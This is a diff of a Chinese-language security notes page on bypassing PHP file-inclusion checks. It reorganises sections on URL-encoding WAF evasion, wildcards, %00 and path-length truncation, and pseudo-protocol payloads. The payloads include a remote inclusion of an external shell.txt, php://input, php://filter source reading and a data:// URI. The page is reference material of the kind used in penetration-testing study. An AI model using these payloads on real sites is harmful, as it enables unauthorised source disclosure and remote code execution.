@@ -18,52 +18,41 @@
 --------------------------------
 常见的应用在文件包含之前，可能会调用函数对其进行判断，一般有如下几种绕过方式
 
-1. 截断
+url绕过
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+如果WAF中是字符串匹配，可以使用url多次编码的方式可以绕过
 
-1.1 %00截断
+特殊字符绕过
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+某些情况下，读文件支持使用Shell通配符，如 ``?`` ``*`` 等
 
-    几乎是最常用的方法，条件是magic_quotes_gpc打开，而且php版本小于5.3.4。
+%00截断
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+几乎是最常用的方法，条件是magic_quotes_gpc打开，而且php版本小于5.3.4。
 
-1.2 长度截断
+长度截断
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-    Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。
+Windows上的文件名长度和文件路径有关。具体关系为：从根目录计算，文件路径长度最长为259个bytes。
 
-    msdn定义```#define MAX_PATH 260```，第260个字符为字符串结尾的```\0```
+msdn定义```#define MAX_PATH 260```，第260个字符为字符串结尾的```\0```
 
-    linux可以用getconf来判断文件名长度限制和文件路径长度限制
+linux可以用getconf来判断文件名长度限制和文件路径长度限制
 
-    获取最长文件路径长度：getconf PATH_MAX /root 得到4096
-    获取最长文件名：getconf NAME_MAX /root 得到255
+获取最长文件路径长度：getconf PATH_MAX /root 得到4096
+获取最长文件名：getconf NAME_MAX /root 得到255
 
-    那么在长度有限的时候，```././././``` (n个) 的形式就可以通过这个把路径爆掉
+那么在长度有限的时候，```././././``` (n个) 的形式就可以通过这个把路径爆掉
 
-2. 伪协议绕过
-    - RCE: requires allow_url_fopen=On and allow_url_include=On
-    
-    ::
+伪协议绕过
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-        ?file=[http|https|ftp]://websec.wordpress.com/shell.txt
+- 远程包含: 要求 ``allow_url_fopen=On`` and ``allow_url_include=On`` ， payload为 ``?file=[http|https|ftp]://websec.wordpress.com/shell.txt``
 
-    - PHP INPUT: specify your payload in the POST parameters, watch urlencoding, details here, requires allow_url_include=On
+- PHP INPUT: 把payload放在POST参数中作为包含的文件，要求 ``allow_url_include=On`` ，payload为 ``?file=php://input``
 
-    ::
+- BASE64: 使用Base64伪协议读取文件，payload为 ``?file=php://filter/convert.base64-encode/resource=index.php``
 
-        ?file=php://input
-
-    
-    - BASE64: lets you read PHP source because it wont get evaluated in base64. More details here and here
-
-    ::
-
-        ?file=php://filter/convert.base64-encode/resource=index.php
-
-    
-    - DATA: requires allow_url_include=On
-
-    ::
-
-        ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
+- DATA: 使用data伪协议读取文件，payload为 ``?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`` 要求 ``allow_url_include=On``
 
 
-3. url绕过
-4. 特殊字符绕过
